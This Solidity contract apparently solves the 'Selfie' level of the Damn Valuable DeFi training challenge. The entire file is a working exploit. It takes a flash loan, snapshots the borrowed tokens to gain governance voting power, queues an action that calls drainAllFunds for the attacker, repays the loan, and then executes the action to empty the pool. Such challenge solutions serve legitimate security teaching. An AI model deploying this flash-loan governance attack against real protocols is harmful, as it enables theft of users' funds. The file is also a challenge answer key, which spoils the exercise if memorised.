// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool public selfie;
    SimpleGovernance public gov;
    DamnValuableTokenSnapshot dvt;
    address public attacker;
    uint256 public actionId;

    constructor(
        address _selfie,
        address _gov,
        address _attacker,
        address _erc20
    ) {
        selfie = SelfiePool(_selfie);
        gov = SimpleGovernance(_gov);
        attacker = _attacker;
        dvt = DamnValuableTokenSnapshot(_erc20);
    }

    function flashMe(uint256 amount) external {
        //dvt.snapshot();
        selfie.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        //Build Call Function
        dvt.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );
        actionId = gov.queueAction(address(selfie), data, 0);

        dvt.transfer(address(selfie), dvt.balanceOf(address(this)));
    }

    function drainFunds() external {
        gov.executeAction(actionId);
    }

    receive() external payable {}
}
